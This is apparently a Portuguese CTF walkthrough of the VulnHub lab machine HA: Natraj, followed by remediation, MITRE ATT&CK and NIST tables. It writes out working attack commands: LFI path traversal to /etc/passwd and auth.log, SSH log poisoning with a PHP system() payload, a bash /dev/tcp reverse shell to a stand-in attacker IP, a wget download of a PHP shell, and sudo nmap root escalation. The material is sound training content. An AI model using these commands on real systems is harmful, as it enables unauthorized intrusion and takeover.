# HA: Natraj — A Dança da Destruição Leva Direto ao Root

Nataraja, o dançarino cósmico, o Senhor Shiva em sua forma mais feroz e criativa: um pé levantado, o universo em equilíbrio e movimento. HA: Natraj canaliza essa energia perfeitamente. A máquina dança do LFI ao RCE via envenenamento de log SSH, pivota por um arquivo de configuração Apache gravável, e finaliza com o clássico sudo nmap em modo interativo. Cada passo flui para o próximo. Elegante, devastador e sensacional como experiência de aprendizado.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Natraj |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-natraj,489/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios, descoberta de LFI, envenenamento de log SSH (LFI para RCE), exploração de apache2.conf gravável, pivot por reinício de serviço, sudo nmap GTFOBin |
| **CVEs** | CWE-22 (Path Traversal: LFI via parâmetro file), CWE-78 (Injeção de Comando OS: RCE via envenenamento de log), CWE-269 (Gerenciamento de Privilégio Impróprio: sudo nmap), CWE-284 (Controle de Acesso Impróprio: apache2.conf gravável por todos) |
| **Grupos APT** | APT33 (Elfin): usa vulnerabilidades LFI em aplicações web como vetor principal de acesso inicial em alvos do setor de energia; APT41: encadeia LFI com envenenamento de log para entrega de webshell |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  → dirb → /console/ → file.php
  → file.php?file=../../../../etc/passwd → LFI confirmado
  → file.php?file=../../../../var/log/auth.log → log legível
  → ssh '<?php system($_GET["cmd"]); ?>'@alvo → payload injetado no auth.log
  → file.php?file=...auth.log&cmd=id → RCE como www-data
  → shell reverso → estabilização com python3 pty
  → find / -writable → /etc/apache2/apache2.conf
  → modificar diretiva User: www-data → mahakal
  → implantar shell.php no web root → reiniciar apache
  → shell como mahakal
  → sudo -l → (root) NOPASSWD: /usr/bin/nmap
  → sudo nmap --interactive → !sh → uid=0(root)
  → cat /root/flag.txt
```

---

## Metodologia

1. Varredura completa de portas: identificar SSH e HTTP
2. Brute-force de diretórios: encontrar /console/ e file.php
3. Teste de LFI via parâmetro file
4. Confirmar que auth.log é legível via LFI
5. Envenenamento de log SSH: injetar payload PHP via login SSH fracassado
6. Weaponizar LFI para executar payload injetado (RCE)
7. Estabilizar shell reverso
8. Enumerar arquivos graváveis: encontrar apache2.conf
9. Modificar diretiva User do Apache para mahakal; reimplantar shell
10. Pivotar para mahakal via reinício do Apache
11. Escalação de privilégios: sudo nmap --interactive

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
netdiscover
# Alvo: 192.168.10.156

nmap -sV -sC -p- 192.168.10.156
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços. HTTP é a superfície de ataque principal. SSH será weaponizado como vetor de envenenamento de log.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Navegue até `http://192.168.10.156`. A página exibe imagens de Nataraja. Inspeção do código-fonte e robots.txt não revelam nada imediatamente útil.

```bash
dirb http://192.168.10.156
```

Dirb encontra `/console/`. Ao navegar lá, aparece `file.php`.

```bash
curl http://192.168.10.156/console/file.php
# Resposta vazia: aguardando parâmetro
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Descoberta de Local File Inclusion

Teste o parâmetro `file` para path traversal:

```bash
curl "http://192.168.10.156/console/file.php?file=../../../../etc/passwd"
```

A resposta inclui o conteúdo completo de `/etc/passwd`. LFI confirmado.

Usuários descobertos: `www-data`, `mahakal` (usuário personalizado).

Verifique se o log de autenticação SSH é legível:

```bash
curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log"
```

O auth.log está acessível. Esse é o habilitador chave para o envenenamento de log. Caramba.

**Nota do mundo real:** LFIs que conseguem ler arquivos de log são consistentemente escaláveis para RCE. O auth.log é particularmente perigoso porque cada tentativa de login SSH, incluindo o campo de nome de usuário, é gravada nele literalmente. O APT33 usou essa cadeia LFI para auth.log em múltiplas intrusões.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1203 — Exploração para Execução no Cliente

---

## Passo 4 — Envenenamento de Log SSH: LFI para RCE

Injete uma linha PHP no auth.log usando-a como nome de usuário SSH em um login fracassado:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.10.156
# Entre qualquer senha: o login vai falhar
# O nome de usuário (payload PHP) agora está gravado no auth.log
```

Verifique execução de código passando um comando via parâmetro LFI:

```bash
curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log&cmd=id"
```

Saída esperada na resposta: `uid=33(www-data)`. RCE como www-data confirmado.

**Nota do mundo real:** Os logs de autenticação SSH gravam o campo de nome de usuário sem sanitização ou codificação. Esse caminho LFI para RCE por envenenamento de log é conhecido há mais de uma década, mas as organizações continuam implantando aplicações com LFI ao lado de serviços SSH no mesmo host.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Shell Unix

---

## Passo 5 — Shell Reverso como www-data

Configure um listener netcat na máquina atacante:

```bash
nc -lvnp 1234
```

Codifique o payload do shell reverso em URL e entregue via cadeia LFI + RCE:

```bash
# Raw: bash -i >& /dev/tcp/IP_ATACANTE/1234 0>&1
# URL-encoded:
curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP_ATACANTE%2F1234%200%3E%261"
```

Shell como `www-data` conecta.

Estabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Shell Unix

---

## Passo 6 — Descobrir Apache Config Gravável

Enumere arquivos graváveis:

```bash
find / -writable -name "apache2.conf" 2>/dev/null
# /etc/apache2/apache2.conf
```

O arquivo de configuração do Apache é gravável por `www-data`. Isso significa que podemos mudar o usuário do sistema sob o qual o Apache executa.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1222 — Modificação de Permissões

---

## Passo 7 — Pivotar para mahakal via Diretiva User do Apache

Edite diretamente no alvo:

```bash
sed -i 's/User www-data/User mahakal/g' /etc/apache2/apache2.conf
```

Implante um novo shell PHP reverso no web root:

```bash
# Na máquina atacante: servir shell.php com LHOST/LPORT editados
python3 -m http.server 8000

# No alvo:
wget http://IP_ATACANTE:8000/shell.php -O /var/www/html/shell.php
```

Inicie listener na porta 5555:

```bash
nc -lvnp 5555
```

Reinicie o Apache:

```bash
sudo /bin/systemctl restart apache2
```

Acione o shell:

```bash
curl http://192.168.10.156/shell.php
```

Shell como `mahakal` conecta. Pivot completo, mano.

**Nota do mundo real:** Arquivos de configuração de serviço graváveis pelo próprio usuário do serviço permitem mudar a identidade de runtime. Essa é uma técnica de movimento lateral particularmente furtiva porque abusa de um mecanismo legítimo de reinício de serviço.

**MITRE ATT&CK:** T1543.002 — Criar ou Modificar Processo do Sistema: Serviço Systemd; T1078 — Contas Válidas

---

## Passo 8 — Escalação de Privilégios: sudo nmap

Verifique permissões sudo como mahakal:

```bash
sudo -l
```

Saída:

```
(root) NOPASSWD: /usr/bin/nmap
```

Escale usando o modo interativo do nmap:

```bash
# Método 1: nmap --interactive (versões mais antigas)
sudo nmap --interactive
# No prompt do nmap:
!sh

# Método 2: execução de script Lua (versões mais novas)
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

Shell root obtido.

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. A dança está completa.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Utilizado para |
|---|---|---|---|
| Leitura LFI | Conteúdo de /etc/passwd | file.php?file=../../../../etc/passwd | Enumeração de usuários |
| RCE via envenenamento de log | Shell como www-data | Injeção PHP no auth.log | Acesso inicial |
| Pivot de shell | mahakal | Mudança na diretiva User do Apache | Movimento lateral |
| Flag root | /root/flag.txt | GTFOBin sudo nmap | Capturada |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | LFI via parâmetro file não sanitizado | OWASP Top 10 A01:2021 (Controle de Acesso Quebrado); encontrado em apps PHP usando include() com input do usuário | Liste em whitelist os caminhos de arquivo permitidos; nunca passe input do usuário para include() |
| 2 | Envenenamento de log SSH escala LFI para RCE | Qualquer LFI que pode ler logs escritos sem sanitização é potencialmente escalável para RCE | Sanitize entradas de log; restrinja a legibilidade de arquivos de log do contexto da aplicação web |
| 3 | apache2.conf gravável por todos permite pivot de identidade | Arquivos de configuração de serviço graváveis pelo usuário do serviço permitem mudança de identidade de runtime | Defina apache2.conf como root:root 644; audite todos os arquivos de config de serviços web |
| 4 | sudo nmap garante root trivial | Qualquer binário listado no GTFOBins em sudoers sem restrições dá root | Audite todas as entradas sudoers contra o GTFOBins; restrinja a comandos específicos e seguros |
| 5 | LFI revela lista de usuários via /etc/passwd | Enumeração de usuários via LFI fornece alvos para brute-force ou pivot subsequente | Corrija LFI antes de se preocupar com impactos secundários; um path traversal habilita toda a cadeia |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (leitura LFI) | T1552.001 |
| Movimento Lateral | Movimento Lateral | Criar ou Modificar Processo do Sistema | T1543.002 |
| Evasão de Defesa | Evasão de Defesa | Modificação de Permissões de Arquivo e Diretório | T1222 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrigir o LFI**: validar e listar em whitelist o parâmetro `file` em `file.php`; nunca passar input do usuário para `include()` ou `readfile()`
2. **Restringir acesso ao arquivo de log**: garantir que `/var/log/auth.log` não seja legível pelo usuário da aplicação web (`chmod 640 /var/log/auth.log; chown root:adm /var/log/auth.log`)
3. **Corrigir propriedade do apache2.conf**: `chown root:root /etc/apache2/apache2.conf; chmod 644 /etc/apache2/apache2.conf`
4. **Remover nmap do sudoers**: deletar ou restringir a entrada sudo do nmap para mahakal
5. **Rotacionar todas as credenciais** de mahakal e qualquer usuário SSH no sistema

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (corrigir LFI; restringir permissões de arquivo de log)
- **D3-OAM**: Gerenciamento Administrativo de SO (restrições sudo; permissões da config apache)
- **D3-NTF**: Filtragem de Tráfego de Rede (restringir conexões de saída do servidor web)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações PHP usando inclusão de arquivo; auditar entradas sudo |
| Proteger | Controle de Acesso | Corrigir LFI; restringir legibilidade de log; remover nmap do sudoers |
| Proteger | Segurança de Dados | Sem parâmetros de caminho de arquivo controlados pelo usuário sem lista de permissões estrita |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas de LFI; detectar execução PHP a partir de arquivos de log |
| Responder | Planejamento de Resposta | Remover shells colocados pelo atacante; rotacionar credenciais; restaurar permissões corretas |
| Recuperar | Planejamento de Recuperação | Corrigir causa raiz do LFI; auditar todas as chamadas include() em PHP |

---

## Reflexões Finais

HA: Natraj é uma aula magistral de encadeamento. LFI sozinho seria interessante. LFI para envenenamento de log para RCE é a dança completa. O pivot via apache2.conf é uma técnica que você não vê na maioria das máquinas para iniciantes, e ela fica na memória.

Nataraja dança através da destruição para criar. Essa máquina faz o mesmo: cada vulnerabilidade destruída, uma postura de segurança melhor criada.

Top demais, véi. Bora pro próximo.

Thanks guys!! (❍ᴥ❍ʋ)
